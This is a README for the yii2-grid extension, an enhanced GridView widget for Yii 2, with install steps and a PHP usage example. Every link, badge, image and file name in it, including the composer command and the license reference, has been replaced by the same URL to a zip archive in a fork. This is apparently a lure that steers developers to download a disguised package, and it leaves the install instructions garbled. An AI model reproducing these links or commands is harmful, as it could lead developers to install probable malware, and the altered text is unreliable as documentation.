<h1 align="center">
    <a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip" title="Krajee Demos" target="_blank">
        <img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip" alt="Krajee Logo"/>
    </a>
    <br>
    yii2-grid
    <hr>
    <a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"
       title="Donate via Paypal" target="_blank"><img height="60" src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip" alt="Donate"/></a>
    &nbsp; &nbsp; &nbsp;
    <a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip" title="Buy me a coffee" ><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip" height="60" alt="kartikv" /></a>
</h1>

<div align="center">

[![Financial Contributors on Open Collective](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip+contributors)](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)
[![Stable Version](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)
[![Unstable Version](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)
[![License](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)

[![Total Downloads](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)
[![Monthly Downloads](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)
[![Daily Downloads](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)

</div>

Yii2 GridView on steroids. A module with various modifications and enhancements to one of the most used widgets by Yii developers. The widget contains new additional Grid Columns with enhanced settings for Yii Framework 2.0. The widget also incorporates various Bootstrap 3.x styling options.
Refer [detailed documentation](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip) and/or a [complete demo](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip). You can also view the [grid grouping demo here](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip).

![GridView Screenshot](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)

### Docs & Demo

You can see detailed [documentation](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip), [demonstration](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)
and API [code documentation](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip) on usage of the extension. You can also view the [grid grouping demo here](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip).

## Installation

The preferred way to install this extension is through [composer](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip).
Read this [web tip /wiki](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip) on setting the `minimum-stability` settings for your application's https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip

### Pre-requisites

Install the necessary pre-requisite (Krajee Dropdown Extension) based on your bootstrap version:

- For Bootstrap v5.x install the extension `kartik-v/yii2-bootstrap5-dropdown`
- For Bootstrap v4.x install the extension `kartik-v/yii2-bootstrap4-dropdown`
- For Bootstrap v3.x install the extension `kartik-v/yii2-dropdown-x`

For example if you are using the Bootstrap v5.x add the following to the `require` section of your `https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip` file:

```
"kartik-v/yii2-bootstrap5-dropdown": "@dev"
```

### Install

Either run:

```
$ php https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip require kartik-v/yii2-grid "@dev"
```

or add

```
"kartik-v/yii2-grid": "@dev"
```

to the ```require``` section of your `https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip` file.

## Usage
```php
use kartik\grid\GridView;
$gridColumns = [
    ['class' => 'kartik\grid\SerialColumn'],
    [
        'class' => 'kartik\grid\EditableColumn',
        'attribute' => 'name',
        'pageSummary' => 'Page Total',
        'vAlign'=>'middle',
        'headerOptions'=>['class'=>'kv-sticky-column'],
        'contentOptions'=>['class'=>'kv-sticky-column'],
        'editableOptions'=>['header'=>'Name', 'size'=>'md']
    ],
    [
        'attribute'=>'color',
        'value'=>function ($model, $key, $index, $widget) {
            return "<span class='badge' style='background-color: {$model->color}'> </span>  <code>" . 
                $model->color . '</code>';
        },
        'filterType'=>GridView::FILTER_COLOR,
        'vAlign'=>'middle',
        'format'=>'raw',
        'width'=>'150px',
        'noWrap'=>true
    ],
    [
        'class'=>'kartik\grid\BooleanColumn',
        'attribute'=>'status', 
        'vAlign'=>'middle',
    ],
    [
        'class' => 'kartik\grid\ActionColumn',
        'dropdown' => true,
        'vAlign'=>'middle',
        'urlCreator' => function($action, $model, $key, $index) { return '#'; },
        'viewOptions'=>['title'=>$viewMsg, 'data-toggle'=>'tooltip'],
        'updateOptions'=>['title'=>$updateMsg, 'data-toggle'=>'tooltip'],
        'deleteOptions'=>['title'=>$deleteMsg, 'data-toggle'=>'tooltip'], 
    ],
    ['class' => 'kartik\grid\CheckboxColumn']
];
echo GridView::widget([
    'dataProvider' => $dataProvider,
    'filterModel' => $searchModel,
    'columns' => $gridColumns,
    'containerOptions' => ['style'=>'overflow: auto'], // only set when $responsive = false
    'beforeHeader'=>[
        [
            'columns'=>[
                ['content'=>'Header Before 1', 'options'=>['colspan'=>4, 'class'=>'text-center warning']], 
                ['content'=>'Header Before 2', 'options'=>['colspan'=>4, 'class'=>'text-center warning']], 
                ['content'=>'Header Before 3', 'options'=>['colspan'=>3, 'class'=>'text-center warning']], 
            ],
            'options'=>['class'=>'skip-export'] // remove this row from export
        ]
    ],
    'toolbar' =>  [
        ['content'=>
            Html::button('&lt;i class="glyphicon glyphicon-plus">&lt;/i>', ['type'=>'button', 'title'=>Yii::t('kvgrid', 'Add Book'), 'class'=>'btn btn-success', 'onclick'=>'alert("This will launch the book creation form.\n\nDisabled for this demo!");']) . ' '.
            Html::a('&lt;i class="glyphicon glyphicon-repeat">&lt;/i>', ['grid-demo'], ['data-pjax'=>0, 'class' => 'btn btn-default', 'title'=>Yii::t('kvgrid', 'Reset Grid')])
        ],
        '{export}',
        '{toggleData}'
    ],
    'pjax' => true,
    'bordered' => true,
    'striped' => false,
    'condensed' => false,
    'responsive' => true,
    'hover' => true,
    'floatHeader' => true,
    'floatHeaderOptions' => ['top' => $scrollingTop],
    'showPageSummary' => true,
    'panel' => [
        'type' => GridView::TYPE_PRIMARY
    ],
]);
```

## Contributors

### Code Contributors

This project exists thanks to all the people who contribute. [[Contribute](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)]

<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip" /></a>

### Financial Contributors

Become a financial contributor and help us sustain our community. [[Contribute](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)]

#### Individuals

<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>

#### Organizations

Support this project with your organization. Your logo will show up here with a link to your website. [[Contribute](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)]

<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>

## License

**yii2-grid** is released under the BSD-3-Clause License. See the bundled `https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip` for details.